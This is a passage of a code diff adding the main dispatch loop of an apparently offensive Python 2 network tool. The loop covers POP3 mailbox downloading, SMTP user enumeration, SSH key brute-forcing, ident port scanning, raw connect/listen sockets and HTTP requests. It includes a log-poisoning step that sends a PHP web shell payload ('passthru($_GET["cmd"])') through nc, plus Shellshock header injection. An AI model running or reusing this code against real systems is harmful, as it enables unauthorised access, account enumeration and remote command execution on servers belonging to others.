+                    log('[%s] 0 messages.' % pname)
+                conn.logout()
+            else:
+                log('[%s] Server: %s' % (pname, conn.getwelcome()))
+
+                log('[%s] Logging in as %s:%s...' % (pname, user, password))
+                conn.user(user)
+                conn.pass_(password)
+
+                cnt, size = conn.stat()
+                log('[%s] %d messages on server (size: %s bytes).' % (pname, cnt, size))
+                for i in xrange(cnt):
+                    resp, lines, octet = conn.retr(i+1)
+                    fn = 'mail#%03d-%s-%s-%s.eml' % (i+1, user, host, port)
+                    log('[%s] Message #%03d: %s -> %s' % (pname, i+1, resp, fn))
+                    open(fn, 'wb').write('\n'.join(lines))
+                conn.quit()
+
+            continue
+
+        if ARGS.smtp_users:
+            log('[SMTP] Connecting to [%s:%s]...' % (host, port))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(ARGS.timeout)
+            s.connect((host, port))
+            banner = s.recv(256).strip()
+            log('[SMTP] Server: %s' % banner)
+            s.close()
+            if ARGS.smtp_method == 'RCPT':
+                cmd = "RCPT TO:"
+            else:
+                cmd = ARGS.smtp_method
+            users = [x.strip() for x in RX['sep'].split(data) if x.strip()]
+            while users:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(ARGS.timeout)
+                s.connect((host, port))
+                msg = s.recv(256).strip()
+                if ARGS.smtp_method == 'RCPT':
+                    msg = socket_sendrecv(s, 'HELO\n', recvsize=128, section='SMTP')
+                    if msg.startswith('501'):
+                        msg = socket_sendrecv(s, 'HELO x.com\n', recvsize=128, section='SMTP')
+                    frm = ('root@%s' % ARGS.smtp_domain) if ARGS.smtp_domain else 'root'
+                    msg = socket_sendrecv(s, 'MAIL FROM:%s\n' % frm, recvsize=128, section='SMTP')
+                    if msg.startswith('553') and not ARGS.smtp_domain:
+                        die('Server requires domain name! User --smtp-domain')
+                for i in xrange(5):
+                    usr = users.pop(0)
+                    log('[SMTP] Checking user [%s]...' % usr)
+                    #if ARGS.smtp_domain:
+                    #    usr += '@' + ARGS.smtp_domain
+                    msg = '%s %s\n' % (cmd, usr)
+                    msg = socket_sendrecv(s, msg, recvsize=128, section='SMTP')
+                    log('[SMTP] Result: %s' % msg.strip())
+                    if (not users) or ARGS.smtp_method == 'RCPT':
+                        break
+                s.close()
+            log('[SMTP] Done checking users.')
+            s.close()
+            continue
+
+        if ARGS.mail:
+            body = data
+            if ARGS.mail_attach:
+                msg = MIMEMultipart('alternative')
+                att1 = MIMEText(body, 'plain')
+                msg.attach(att1)
+                att2 = MIMEBase('application', 'pdf')
+                att2.set_payload(open(ARGS.mail_attach, 'rb').read())
+                Encoders.encode_base64(att2)
+                att2.add_header('Content-Disposition', 'attachment', filename=os.path.basename(ARGS.mail_attach))
+                msg.attach(att2)
+            else:
+                msg = MIMEText(body)
+            if ARGS.mail_subject:
+                msg['Subject'] = ARGS.mail_subject
+            if not ARGS.mail_from:
+                raise ValueError('--mail-from is required!')
+            msg['From'] = ARGS.mail_from
+            if not ARGS.mail_to:
+                raise ValueError('--mail-to is required!')
+            msg['To'] = ARGS.mail_to
+            log('[SMTP] Connecting to [%s:%s]...' % (host, port))
+            s = smtplib.SMTP(host, port)
+            if ARGS.verbose:
+                s.set_debuglevel(2)
+            if password:
+                log('[SMTP] Logging in as [%s]:[%s]...' % (user, password))
+                s.login(user, password)
+            log('[SMTP] Sending mail [%s] from [%s] to [%s]...' % (ARGS.mail_subject, msg['From'], msg['To']))
+            s.sendmail(msg['From'], [msg['To']], msg.as_string())
+            s.quit()
+            continue
+
+
+        # SSH stuff
+        if ARGS.brute_force_ssh_key:
+            if not bf_ssh_filenames:
+                die('[SSH-KEY] No key files found!')
+            total = len(bf_ssh_filenames)
+            log('[SSH-KEY] Connecting to [%s:%s] as [%s]; %d key files left to try.' % (host, port,
+                    user, total))
+            do_work('brute_force_ssh_key', fun_do_work=ssh_try_keyfile, get_work=bf_ssh_filenames,
+                    ctx={'user':user, 'port':port, 'host':host}, total=total)
+            continue
+
+
+        # ident stuff
+        if ARGS.ident_scan:
+            log('[IDENT] Connecting to [%s:%s]...' % (host, port))
+            sid = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sid.settimeout(ARGS.timeout)
+            sid.connect((host, port))
+            sid_lport = sid.getsockname()[1]
+            log('[IDENT] - ident LPORT [%s]' % (sid_lport), 1)
+            i = 0
+            for prange in ARGS.ident_scan:
+                r = port_range(prange)
+                for p in r:
+                    if i and i % 100 == 0 or ARGS.verbose:
+                        log('[IDENT] Checking port [%s]...' % (p,))
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(3)
+                    try:
+                        i += 1
+                        s.connect((host, p))
+                        lport = s.getsockname()[1]
+                    except socket.timeout, e:
+                        continue
+                    except socket.error, e:
+                        # [Errno 111] Connection refused
+                        ee = str(e)
+                        if '[Errno 111]' in ee:
+                            continue
+                        else:
+                            raise
+                    log('[IDENT] - connected to [%s] (LPORT: [%s]); identifying...' % (p, lport), 2)
+                    sid.send(str(p) + "," + str(lport) + "\n")
+                    data = sid.recv(1024)
+                    if ARGS.verbose or ('ERROR' not in data):
+                        data = data.strip().split(':', 2)[-1]
+                        log('[IDENT] PORT %5s: %s' % (p, data))
+            sid.close()
+            continue
+
+        # plain sockets
+        if ARGS.connect:
+            log('[SOCK] Connecting to [%s:%s]...' % (host, port))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setblocking(0)
+            fcntl.fcntl(sys.stdin, fcntl.F_SETFL, fcntl.fcntl(sys.stdin, fcntl.F_GETFL) | os.O_NONBLOCK)
+            try:
+                s.connect((host, port))
+            except socket.error, e:
+                if 'Operation now in progress' not in str(e):
+                    raise
+            while 1:
+                try:
+                    out(s.recv(1024))
+                except IOError, e:
+                    if 'Resource temporarily unavailable' not in str(e):
+                        raise
+                try:
+                    data = sys.stdin.read()
+                    if data:
+                        s.send(data)
+                except IOError, e:
+                    if 'Resource temporarily unavailable' not in str(e):
+                        raise
+                time.sleep(0.1)
+            continue
+
+        # plain sockets
+        if ARGS.listen:
+            if host:
+                lhost = host
+            else:
+                lhost = '0.0.0.0'
+            if port:
+                lport = port
+            else:
+                lport = ARGS.local_port
+            log('[SOCK] Listening on [%s:%s]...' % (lhost, lport))
+            ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            ss.bind((lhost, lport))
+            ss.listen(1)
+            fcntl.fcntl(sys.stdin, fcntl.F_SETFL, fcntl.fcntl(sys.stdin, fcntl.F_GETFL) | os.O_NONBLOCK)
+            while 1:
+                s, client = ss.accept()
+                log('[SOCK] [%s:%s] connected' % (client))
+                s.setblocking(0)
+                while 1:
+                    try:
+                        out(s.recv(1024))
+                    except IOError, e:
+                        if 'Resource temporarily unavailable' not in str(e):
+                            raise
+                    try:
+                        data = sys.stdin.read()
+                        if data:
+                            s.send(data)
+                    except IOError, e:
+                        if 'Resource temporarily unavailable' not in str(e):
+                            raise
+                    time.sleep(0.1)
+            continue
+
+        # HTTP stuff
+        if ARGS.php_error_inject:
+            error = '<?php passthru($_GET["cmd"]);exit(0); ?>'
+            cmd = "echo -e 'GET %s HTTP/1.0\\n\\n'|nc %s %s" % (error, host, port)
+            log('Running [%s]...' % cmd)
+            os.system(cmd)
+            continue
+
+        # XML special processing
+        if ARGS.xml_rpc_request:
+            if len(ARGS.xml_rpc_request) > 1:
+                params = ARGS.xml_rpc_request[1:]
+                params = [e.split('=', 1) for e in params]
+                for p in params:
+                    if len(p) < 2:
+                        die('XML RPC param syntax: [name][:type]=value!')
+                    if ':' in p[0]:
+                        p.append(p[0].split(':')[1])
+                        p[0] = p[0].split(':')[0]
+                    else:
+                        p.append('string')
+                params = ''.join('<param><value><%s>%s</%s></value></param>' % (p[2], p[1], p[2]) for p in params)
+            else:
+                params = ''
+            xml_method = ARGS.xml_rpc_request[0]
+            if xml_method == '?':
+                xml_method = 'system.listMethods'
+            log('[XML-RPC] Method: [%s]' % xml_method, 1)
+            log('[XML-RPC] Params: [%s]' % params, 1)
+            data = "<?xml version=\"1.0\"?><methodCall><methodName>%s</methodName><params>%s</params></methodCall>" % (xml_method, params)
+            ARGS.content_type = 'X'
+            method = 'POST'
+            if not path:
+                path = '/xmlrpc.php'
+
+        # headers
+        if ARGS.content_type:
+            headers['Content-Type'] = CONTENT_TYPES[ARGS.content_type]
+        if method == 'POST' and ARGS.add_content_length:
+            headers['Content-Length'] = len(data)
+        if ARGS.add_user_agent:
+            headers['User-Agent'] = ARGS.add_user_agent
+        if ARGS.add_http_header:
+            for h in ARGS.add_http_header:
+                h = h.split(': ', 1)
+                headers[h[0]] = h[1]
+        if 'Content-Type' not in headers and method == 'POST':
+            headers['Content-Type'] = CONTENT_TYPES['F']
+
+        if ARGS.check_shellshock:
+            if ARGS.command:
+                check = SHELLSHOCK_TEMPLATE % ARGS.command.replace('"', '\\"')
+            else:
+                check = SHELLSHOCK_CHECK
+            for k in ['User-Agent', 'Cookie', 'Referer']: #'Host',
+                if k not in headers:
+                    headers[k] = check
+            errcode, code, result, rheaders, (reason, long_reason) = http_request(host, path, data,
+                    proto=proto, method=method, headers=headers, port=port,
+                    user=user, password=password)
+            log('[HTTP] Result: %d (%s) - %s' % (code, reason, long_reason))
+            if ARGS.verbose >= 2:
+                out(str(rheaders) + '\n')
+            if result:
+                log('[HTTP] Response:', 2)
+                if ARGS.count:
+                    result = result[:ARGS.count]
+                out(result)
+
+        elif ARGS.http_request or ARGS.xml_rpc_request:
+            errcode, code, result, rheaders, (reason, long_reason) = http_request(host, path, data,
+                    proto=proto, method=method, headers=headers, port=port,
+                    user=user, password=password)
+            log('[HTTP] Result: %d (%s) - %s' % (code, reason, long_reason))
+            if ARGS.verbose >= 2:
+                out(str(rheaders) + '\n')
+            if result:
+                log('[HTTP] Response:', 2)
+                if ARGS.count:
+                    result = result[:ARGS.count]
+                out(result)
+
+        elif ARGS.robots_txt:
+            errcode, code, result, rheaders, (reason, long_reason) = http_request(host, '/robots.txt',
+                    proto=proto, method='GET', headers=headers, port=port,
+                    user=user, password=password)
+            if ARGS.verbose >= 2:
+                out(str(rheaders) + '\n')
+            if result:
+                log('[HTTP] Response:', 2)
+                if ARGS.count:
+                    result = result[:ARGS.count]
+                out(result)
+        else:
+            die('No operation requested!')
+
+
+
+if __name__ == '__main__':
+    try:
+        run_tool()
+    except KeyboardInterrupt, e:
+        log("[QUIT] Ctrl+C pressed.")
+        if WORK:
+            WORK.log_status()
+            WORK.stop()
+        sys.exit()
+
